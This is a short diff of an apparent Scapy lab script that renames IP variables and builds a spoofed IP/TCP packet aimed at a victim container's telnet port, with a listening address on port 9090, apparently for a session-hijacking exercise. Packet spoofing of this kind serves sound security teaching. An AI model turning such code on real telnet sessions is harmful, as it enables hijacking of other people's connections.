@@ -12,12 +12,12 @@ strListeningIP = "10.9.0.1"
 intListeningPort = 9090
 
 # Targeting victim/server container's telnet port
-strSourceIP = "10.9.0.5"
-strDestinationIP = "10.9.0.6"
+strClientIP = "10.9.0.6"
+strServerIP = "10.9.0.5"
 intDestinationPort =  23
 
 # Build the IP layer of the packet
-lyrIP = IP(src=strSourceIP, dst=strDestinationIP)
+lyrIP = IP(src=strClientIP, dst=strServerIP)
 
 # Build TCP layer of the packet
 lyrTCP = TCP(sport=intSourcePort,
